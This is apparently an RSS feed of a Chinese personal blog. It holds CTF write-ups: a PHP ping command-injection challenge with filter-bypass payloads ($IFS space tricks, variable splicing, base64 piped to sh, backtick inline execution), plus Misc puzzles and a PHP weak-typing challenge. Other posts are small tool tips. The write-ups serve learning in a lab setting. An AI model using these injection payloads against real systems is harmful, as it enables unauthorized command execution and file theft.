&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">/?&lt;/span>&lt;span style="color:#a6e22e">ip&lt;/span>&lt;span style="color:#f92672">=|&lt;/span>&lt;span style="color:#a6e22e">\&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#a6e22e">\&lt;/span>&lt;span style="color:#e6db74">&amp;#34;|&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">|\(|\)|\[|\]|\{|\}/&amp;#34;&lt;/span>, $ip, $match)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x{00}-\x{20}]|\&amp;gt;|\&amp;#39;|&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">|&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">|\(|\)|\[|\]|\{|\}/&amp;#34;&lt;/span>, $ip, $match);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your symbol!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/ /&amp;#34;&lt;/span>, $ip)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your space!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/bash/&amp;#34;&lt;/span>, $ip)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your bash!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">preg_match&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/.*f.*l.*a.*g.*/&amp;#34;&lt;/span>, $ip)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fxck your flag!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">shell_exec&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ping -c 4 &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$ip);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">print_r&lt;/span>($a);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问&lt;strong>flag.php&lt;/strong>。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用&lt;strong>readflag&lt;/strong>的ELF执行文件访问，但是还没成功。其实执行：&lt;/p>
&lt;pre tabindex="0">&lt;code>?ip=|cat$IFS`ls`
&lt;/code>&lt;/pre>&lt;p>这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了&lt;del>我是傻逼&lt;/del>。&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205110806.png" alt="">&lt;/p>
&lt;p>&lt;strong>最后记录下学到的姿势和这道题目的其他思路&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>管道符：&lt;/p>
&lt;ul>
&lt;li>&lt;code>|&lt;/code>直接执行后面的语句。&lt;/li>
&lt;li>&lt;code>||&lt;/code>如果前面语句错误，执行后面的语句。&lt;/li>
&lt;li>&lt;code>&amp;amp;&lt;/code>前面和后面命令都要执行，无论前面真假，&lt;/li>
&lt;li>&lt;code>&amp;amp;&amp;amp;&lt;/code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>使用以下绕过空格：&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$IFS
${IFS}
${IFS}$1
$IFS$1 //$1改成$加其他数字貌似都行
&amp;lt;
&amp;lt;&amp;gt; 
{cat,flag.php} //用逗号实现了空格功能
%20 
%09 //需要php环境
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>覆盖源码里的&lt;code>$a&lt;/code>变量（拼接变量）：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>使用sh执行脚本：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>内联执行：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/?ip=|cat$IFS`ls`
&lt;/code>&lt;/pre>&lt;blockquote>
&lt;p>附：大佬整理的博客（内含更多姿势）：&lt;a href="https://www.ghtwf01.cn/index.php/archives/273/">命令执行漏洞利用及绕过方式总结&lt;/a>&lt;/p></description></item><item><title>DMCTF之Misc</title><link>/posts/ctf/dmctf%E4%B9%8Bmisc/</link><pubDate>Tue, 01 Dec 2020 11:20:45 +0000</pubDate><guid>/posts/ctf/dmctf%E4%B9%8Bmisc/</guid><description>&lt;h1 id="前言">前言&lt;/h1>
&lt;p>这次比赛是第一次做Mics的题awa。&lt;/p>
&lt;h1 id="misc">Misc&lt;/h1>
&lt;h2 id="check_in">Check_in&lt;/h2>
&lt;p>真·有手就行&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130102716.png" alt="">&lt;/p>
&lt;h2 id="fakezip">fakezip&lt;/h2>
&lt;p>看到题目&lt;strong>fakezip&lt;/strong>翻译：假的压缩包，所以猜应该是伪加密，贴一个原理的博客：&lt;a href="https://blog.csdn.net/u011377996/article/details/79286958">zip伪加密&lt;/a>，使用010 Editor打开压缩包，&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130103932.png" alt="">&lt;/p>
&lt;p>找到01修改为00，再解压压缩包，虽然提示了压缩包错误但是直接无视，获得一个flag.txt&lt;/p>
&lt;p>打开以后内容是：&lt;code>♬♩¶♯♬♭♬♫♫♪♬∮♬♭‖♭♬♭♬∮♬♭‖♭♬♭♫♫♯=&lt;/code>，音符加密虽然是第一次听说，但是百度还是可以简单找到：&lt;a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">文本加密为音乐符号&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130104321.png" alt="">&lt;/p>
&lt;h2 id="base-family">Base family&lt;/h2>
&lt;p>题目给出了是base家族，所以base所有种类都试一遍。base常见的种类有：&lt;code>base16&lt;/code>、&lt;code>base32&lt;/code>、&lt;code>base58&lt;/code>、&lt;code>base64&lt;/code>、&lt;code>base91&lt;/code>。还有几种没听过的base种类可以在这个网站找到：&lt;a href="http://ctf.ssleye.com/">CTF在线工具&lt;/a>。&lt;/p>
&lt;p>&lt;strong>原层&lt;/strong>：&lt;/p>
&lt;pre tabindex="0">&lt;code>XUZbB{fp}U)=ql[n%GCbk9RZ7!XD$D)f1G{011LN(TSlXCJT:4nxQ[8Y#I:=k.Qi4t3/S!,N/%[I}^8jjP|0&amp;amp;whvi88gpQce(2lKt9ZHiT^g1.nZH,k=kjTT16pHJ_DrW,Td&amp;#34;^w$Q8+8T])e.llK?*z`gS:+C]llUG:z1=ekEN}8DmJf&amp;amp;GP&amp;lt;Rk:o_Jk&amp;lt;J.zp8%H0g7sYSTJ9p.&amp;#34;duRBGj`g0!I+xjm(fh)]IF:&amp;gt;omN8=m+Xp(X0:U*8Sj5|8p._o[i0:%.qu}%_=&amp;lt;D
&lt;/code>&lt;/pre>&lt;p>&lt;strong>base91解码&lt;/strong>：&lt;/p>
&lt;pre tabindex="0">&lt;code>3G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW
&lt;/code>&lt;/pre>&lt;p>&lt;strong>base58解码&lt;/strong>：&lt;/p>
&lt;pre tabindex="0">&lt;code>JZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5
&lt;/code>&lt;/pre>&lt;p>&lt;strong>base32解码&lt;/strong>：&lt;/p>
&lt;pre tabindex="0">&lt;code>NjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q=
&lt;/code>&lt;/pre>&lt;p>&lt;strong>base64解码&lt;/strong>：&lt;/p>
&lt;pre tabindex="0">&lt;code>666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d
&lt;/code>&lt;/pre>&lt;p>&lt;strong>hex解码&lt;/strong>：&lt;/p>
&lt;pre tabindex="0">&lt;code>flag{y0u_alr3ady_kn0w_th3_Basefam1ly}
&lt;/code>&lt;/pre>&lt;h2 id="slienteye">SlientEye&lt;/h2>
&lt;p>根据题目直接百度&lt;strong>SlientEye&lt;/strong>，下载以后打开图片&amp;ndash;&amp;gt;decode：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130105145.png" alt="">&lt;/p>
&lt;p>参数啥的都没动，密码为默认密码，直接Decode，得到一个flag.txt：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&amp;amp;#102;&amp;amp;#108;&amp;amp;#97;&amp;amp;#103;&amp;amp;#123;&amp;amp;#110;&amp;amp;#49;&amp;amp;#95;&amp;amp;#98;&amp;amp;#117;&amp;amp;#95;&amp;amp;#106;&amp;amp;#49;&amp;amp;#97;&amp;amp;#110;&amp;amp;#103;&amp;amp;#95;&amp;amp;#119;&amp;amp;#117;&amp;amp;#95;&amp;amp;#100;&amp;amp;#51;&amp;amp;#125;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再去百度搜到一篇博客：&lt;a href="https://www.cnblogs.com/philipding/p/10153094.html">&amp;amp;#x开头的是什么编码?&lt;/a>，&lt;del>我点开一看，哦，原来是&lt;/del>entity code实体编码，&lt;del>我啪的一下就&lt;/del>把flag.txt改为flag.html，&lt;del>很快啊，然后是一个左正蹬、一个右鞭腿、一个左刺拳&lt;/del>打开flag.html获得flag：&lt;strong>flag{n1_bu_j1ang_wu_d3}&lt;/strong>&lt;/p>
&lt;h2 id="编码之王">编码之王&lt;/h2>
&lt;p>下载文件打开后一堆社会主义核心价值观，前面提到的：&lt;a href="http://ctf.ssleye.com/">CTF在线工具&lt;/a>就有核心价值观编码，下面放密文，上面是解码内容。&lt;/p>
&lt;p>解出来以后看到第一句：&lt;code>如是我闻:&lt;/code>，&amp;ndash;&amp;gt;&lt;a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅&lt;/a>&lt;/p>
&lt;p>再解之后看第一句：&lt;code>新佛曰：&lt;/code>。&amp;ndash;&amp;gt;&lt;a href="http://hi.pcmoe.net/buddha.html">新与佛论禅&lt;/a>&lt;/p>
&lt;p>解完以后直接出了一堆由：&lt;code>[、]、!、+、(、)&lt;/code>组成的符号，还是百度找到了这种编码叫JSfuck，可以直接浏览器控制台console输出获得flag&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130110943.png" alt="">&lt;/p>
&lt;h2 id="jpgsteg">jpgsteg&lt;/h2>
&lt;p>题目即是用到的工具，百度下载软件，使用jphide.exe打开图片&lt;code>Tap code.jpg&lt;/code>，选择seek功能解密，密码为123456（我蒙的）：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130111311.png" alt="">&lt;/p>
&lt;p>成功解密后获得一个文档，内容如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>... ....
.. ...
.. ...
. .
... ..
. .
..... .....
.. ....
... ...
.. ..
&lt;/code>&lt;/pre>&lt;p>这里我思索了好久，刚开始以为是摩斯密码，但是又对不上号，最后找到了一个名为敲击码的，正好一行中的&lt;code>.&lt;/code>分成两部分代表坐标&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130111538.png" alt="">&lt;/p>
&lt;p>解码得到：&lt;code>ohhamazing&lt;/code> ，加上括号就是：&lt;strong>flag{ohhamazing}&lt;/strong>&lt;/p>
&lt;p>事后多看了一眼图片命名：&lt;code>Tap code.jpg&lt;/code>。这用啥解密不就在脸上写着的&lt;del>wosabi \0/&lt;/del>。。。&lt;/p>
&lt;h2 id="collision">Collision&lt;/h2>
&lt;p>打开压缩包发现都是加密，但是原始大小都为4，只有CRC不一样：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201201102424.png" alt="">&lt;/p>
&lt;p>所以很有可能是四位数据的CRC32碰撞，就去网上找了一个python脚本：&lt;a href="https://blog.csdn.net/weixin_45396639/article/details/103393759">crc32碰撞 ctf python&lt;/a>作者原创的脚本：&lt;/p></description></item><item><title>PicGo复制自定义链接</title><link>/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/</link><pubDate>Mon, 30 Nov 2020 09:54:11 +0000</pubDate><guid>/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/</guid><description>&lt;p>2022年2月3日22:41:32&lt;/p>
&lt;p>&lt;strong>！！！！！&lt;/strong>&lt;/p>
&lt;p>&lt;strong>建议直接看文章末尾，我发现我就是个笨比。&lt;/strong>&lt;/p>
&lt;h1 id="前言">前言&lt;/h1>
&lt;p>现在博客里面的图片使用的是github+jsdelivr+PicGo图床。PicGo是一个开源的上传图片的软件，支持大部分图床的上传，只需要设置对应的图床参数即可一键上传。github上PicGo的概述：&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>PicGo: 一个用于快速上传图片并获取图片 URL 链接的工具&lt;/strong>&lt;/p>
&lt;p>PicGo 本体支持如下图床：&lt;/p>
&lt;ul>
&lt;li>&lt;code>七牛图床&lt;/code> v1.0&lt;/li>
&lt;li>&lt;code>腾讯云 COS v4\v5 版本&lt;/code> v1.1 &amp;amp; v1.5.0&lt;/li>
&lt;li>&lt;code>又拍云&lt;/code> v1.2.0&lt;/li>
&lt;li>&lt;code>GitHub&lt;/code> v1.5.0&lt;/li>
&lt;li>&lt;code>SM.MS V2&lt;/code> v2.3.0-beta.0&lt;/li>
&lt;li>&lt;code>阿里云 OSS&lt;/code> v1.6.0&lt;/li>
&lt;li>&lt;code>Imgur&lt;/code> v1.6.0&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>本体不再增加默认的图床支持。你可以自行开发第三方图床插件。&lt;/strong>&lt;/p>&lt;/blockquote>
&lt;p>项目地址：&lt;a href="https://github.com/Molunerfinn/PicGo">PicGo&lt;/a>&lt;/p>
&lt;p>软件界面：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130095609.png" alt="">&lt;/p>
&lt;h1 id="起因">起因&lt;/h1>
&lt;p>PicGo上传成功以后可以自动复制url，但是默认复制的图片链接是github提供的，github在国内又经常抽风，图片通常都是无法访问的，所以我使用了jsdelivr提供的链接访问图片，PicGo也提供了自定义链接，但是规定必须包含&lt;code>$url&lt;/code>参数，也就是默认的url地址：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130093835.png" alt="">&lt;/p>
&lt;p>起初是把jsdelivr的链接直接拼在后面，每次使用的时候都再删一次。直到昨晚受不了了就尝试去修改软件试图绕过判断。&lt;/p>
&lt;h1 id="解决方法">解决方法&lt;/h1>
&lt;p>在软件设置的配置文件里找到了&lt;code>customLink&lt;/code>，和之前自己设置的链接对照了一下，认为这个就是实际的自定义链接，直接在此处修改，再上传自动复制的链接就正确了，而且绕过了必须包含$url。&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130094455.png" alt="">&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130094651.png" alt="">&lt;/p>
&lt;h1 id="结语">结语&lt;/h1>
&lt;p>软件提供了自动使用时间戳重命名，所以我自定义链接中还是使用了&lt;code>$filename&lt;/code>变量，然后博客中的图片大部分都是使用QQ的截屏功能，出来的截图后缀都是&lt;code>png&lt;/code>格式，这个可以根据需要自己设定拼接，然后使用的markdown编辑器是typora，想要添加图片直接&lt;code>Crtl+Shift+i&lt;/code>，把图片链接贴里面就彳亍了。~&lt;del>白嫖真爽&lt;/del>&lt;/p>
&lt;hr>
&lt;p>2022-1-31 11:43:48&lt;/p>
&lt;p>这时候发现自定义链接直接用markdown格式就更好了&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-other" data-lang="other">![$fileName](https://cdn.jsdelivr.net/gh/username/repo@master/artical/$fileName.png)
&lt;/code>&lt;/pre>&lt;hr>
&lt;h1 id="最简单修改">最简单修改&lt;/h1>
&lt;p>前面的都是我在改自定义链接，至少明白了可以绕过自定义链接必须包含变量名称这个限制。&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202032246055.png" alt="image-20220203224558136">&lt;/p>
&lt;p>直接在自定义域名那里修改成jsDeliver对应的仓库路径，比如我的&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-other" data-lang="other">https://cdn.jsdelivr.net/gh/penginman/PicBed@master
&lt;/code>&lt;/pre>&lt;p>然后返回的链接就会把原来的&lt;code>raw.github.com/xxxxxx&lt;/code>给替代了。&lt;/p></description></item><item><title>DMCTF之Web</title><link>/posts/ctf/dmctf%E4%B9%8Bweb/</link><pubDate>Sun, 29 Nov 2020 23:17:50 +0000</pubDate><guid>/posts/ctf/dmctf%E4%B9%8Bweb/</guid><description>&lt;h1 id="前言">前言&lt;/h1>
&lt;p>比赛地址：&lt;a href="http://dmctf.vaala.cloud:81/">http://dmctf.vaala.cloud:81&lt;/a>&lt;/p>
&lt;p>这次先写Web题目部分，我最后的排名：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png" alt="img">&lt;/p>
&lt;h1 id="web">Web&lt;/h1>
&lt;h2 id="weak_type">weak_type&lt;/h2>
&lt;p>源码：&lt;/p>
&lt;pre tabindex="0">&lt;code>PHP
&amp;lt;?php

show_source(__FILE__);
include(&amp;#39;class.php&amp;#39;);

//level1 

if(isset($_GET[&amp;#39;num&amp;#39;])){
 $num = $_GET[&amp;#39;num&amp;#39;];
 if($num===&amp;#34;202020020&amp;#34;){
 die(&amp;#34;no no no!&amp;#34;);
 }
 if(intval($num,0)===202020020){
 echo &amp;#34;&amp;lt;br&amp;gt; level 1 Ok &amp;lt;br&amp;gt;&amp;#34;;
 }else{
 die(&amp;#39;what are you doing?&amp;#39;);
 }
}else{
 die();
}

//level 2

if(isset($_GET[&amp;#39;v1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v2&amp;#39;])){
 $v1 = $_GET[&amp;#39;v1&amp;#39;];
 $v2 = $_GET[&amp;#39;v2&amp;#39;];
 if($v1 != $v2 &amp;amp;&amp;amp; md5($v1)==md5($v2)){
 echo &amp;#34;&amp;lt;br&amp;gt; level 2 Ok &amp;lt;br&amp;gt;&amp;#34;;
 }else{
 die(&amp;#39;Are you kidding me ?&amp;#39;);
 }
}else{
 die();
}

//level 3 

if (isset($_POST[&amp;#39;message&amp;#39;])) {
 $message = json_decode($_POST[&amp;#39;message&amp;#39;]);
 if ($message-&amp;gt;key == $key) {
 echo &amp;#34;&amp;lt;br&amp;gt; Wow you got it !!! &amp;lt;br&amp;gt;&amp;#34;;
 echo file_get_contents(&amp;#39;/flag&amp;#39;);
 } 
 else {
 die(&amp;#34;fail&amp;#34;);
 }
 }
else{
 echo &amp;#34;~~~~&amp;#34;;
 }
&lt;/code>&lt;/pre>&lt;p>&lt;strong>第一关&lt;/strong>利用intval()函数特性：直到遇上数字或正负符号才开始做转换。所以构造&lt;code>num=202020020a&lt;/code>，即可。&lt;/p></description></item><item><title>jsdelivr 缓存刷新</title><link>/posts/play_time/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/</link><pubDate>Fri, 20 Nov 2020 22:02:46 +0000</pubDate><guid>/posts/play_time/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>​	上一篇修改了黑幕，但是使用了jsdelivr加速的静态资源，所以照常更新下github上的资源，但是github上查看已经上传成功了，jsdelivr访问的依然是之前的资源，说白了就是缓存的问题。即使本地浏览器端的缓存已经清理，也会因为CDN周围的节点没有同步数据而导致用户端未能及时更新。&lt;/p>
&lt;h2 id="缓存刷新">缓存刷新&lt;/h2>
&lt;p>把原来访问的链接&lt;/p>
&lt;p>&lt;code>https://cdn.jsdelivr.net/...&lt;/code>&lt;/p>
&lt;p>改为&lt;/p>
&lt;p>&lt;code>https://purge.jsdelivr.net/...&lt;/code>&lt;/p>
&lt;p>访问资源就会进行刷新，然后页面会返回刷新信息：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201120222419.png" alt="">&lt;/p>
&lt;p>划水收工。&lt;/p></description></item><item><title>萌娘百科黑幕实现</title><link>/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/</link><pubDate>Fri, 20 Nov 2020 10:13:07 +0000</pubDate><guid>/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>​	老早就觉得&lt;a href="https://zh.moegirl.org.cn/Mainpage">萌娘百科&lt;/a>里的&lt;code>&amp;lt;span class='heimu'&amp;gt;黑幕&amp;lt;/span&amp;gt;&lt;/code>很好玩，所以摸索着给自己博客加了一个。参考博客&lt;a href="https://www.cnblogs.com/send-off-a-friend/p/12355387.html">Re：萌娘百科上的黑幕实现&lt;/a>。不过我改的方法有稍稍有点不同，是把hexo渲染markdown文章中的删除线&lt;code>~~ ~~&lt;/code>标签修改了。我回来又想到了更好的方法，markdown支持文章中的&lt;strong>自定义标签&lt;/strong>，自己增加一个&lt;code>&amp;lt;span class='heimu'&amp;gt;...&amp;lt;/span&amp;gt;&lt;/code>标签更好。那么两种都记一下吧。当然用&lt;strong>自定义标签&lt;/strong>的话还可以保留&lt;strong>删除线&lt;/strong>。&lt;/p>
&lt;h2 id="示例">示例&lt;/h2>
&lt;pre tabindex="0">&lt;code>&amp;lt;span class=&amp;#39;heimu&amp;#39;&amp;gt;我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气&amp;lt;/span&amp;gt;
&amp;lt;span class=&amp;#39;heimu&amp;#39;&amp;gt;我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气&amp;lt;/span&amp;gt;
&amp;lt;span class=&amp;#39;heimu&amp;#39;&amp;gt;~~我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气~~&amp;lt;/span&amp;gt;
&amp;lt;span class=&amp;#39;heimu&amp;#39;&amp;gt;**我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气**&amp;lt;/span&amp;gt;
&amp;lt;span class=&amp;#39;heimu&amp;#39;&amp;gt;我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气`&amp;lt;/span&amp;gt;
&lt;/code>&lt;/pre>&lt;p>原博客图&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210818171850.png" alt="">&lt;/p>
&lt;p>萌娘百科&lt;a href="https://zh.moegirl.org.cn/Template:%E9%BB%91%E5%B9%95">官方介绍&lt;/a>&lt;/p>
&lt;h2 id="准备工作">准备工作&lt;/h2>
&lt;p>​	先进入主题的资源文件夹&lt;code>themes\butterfly\source\&lt;/code>，修改需要用到的文件&lt;code>css\_global\index.styl&lt;/code>、&lt;code>js/main.js&lt;/code>。&lt;/p>
&lt;p>​	说明一下两个文件的作用：主题的总样式表&lt;code>index.css&lt;/code>是经过整合形成的，而**.styl文件是基于Node.js的CSS的预处理框架**，我们会在这个里面添加黑幕的样式。&lt;code>main.js&lt;/code>里面使用选择器为标签添加&lt;code>title='你知道的太多了'&lt;/code>，这个可以修改成自己喜欢的。&lt;/p>
&lt;h2 id="修改自定义标签">修改自定义标签&lt;/h2>
&lt;ol>
&lt;li>在&lt;code>index.styl&lt;/code>文件末尾添加&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-stylus" data-lang="stylus">&lt;span style="display:flex;">&lt;span> .&lt;span style="color:#a6e22e">heimu&lt;/span>, .&lt;span style="color:#a6e22e">heimu&lt;/span> &lt;span style="color:#f92672">a&lt;/span>, &lt;span style="color:#f92672">a&lt;/span> .&lt;span style="color:#a6e22e">heimu&lt;/span>, .&lt;span style="color:#a6e22e">heimu&lt;/span> &lt;span style="color:#f92672">a&lt;/span>.&lt;span style="color:#a6e22e">new&lt;/span>, .&lt;span style="color:#a6e22e">heimu&lt;/span> &lt;span style="color:#f92672">code&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> background&lt;span style="color:#f92672">-&lt;/span>color: &lt;span style="color:#ae81ff">#252525&lt;/span> !important
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> color: &lt;span style="color:#ae81ff">#252525&lt;/span> !important
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> text-shadow: &lt;span style="color:#66d9ef">none&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .&lt;span style="color:#a6e22e">heimu&lt;/span>:&lt;span style="color:#960050;background-color:#1e0010">hover&lt;/span>, .&lt;span style="color:#a6e22e">heimu&lt;/span>:&lt;span style="color:#960050;background-color:#1e0010">active&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .&lt;span style="color:#a6e22e">heimu&lt;/span>:&lt;span style="color:#960050;background-color:#1e0010">hover&lt;/span> .&lt;span style="color:#a6e22e">heimu&lt;/span>, .&lt;span style="color:#a6e22e">heimu&lt;/span>:&lt;span style="color:#960050;background-color:#1e0010">active&lt;/span> .&lt;span style="color:#a6e22e">heimu&lt;/span>,.&lt;span style="color:#a6e22e">heimu&lt;/span> &lt;span style="color:#f92672">code&lt;/span>:&lt;span style="color:#960050;background-color:#1e0010">hover&lt;/span>
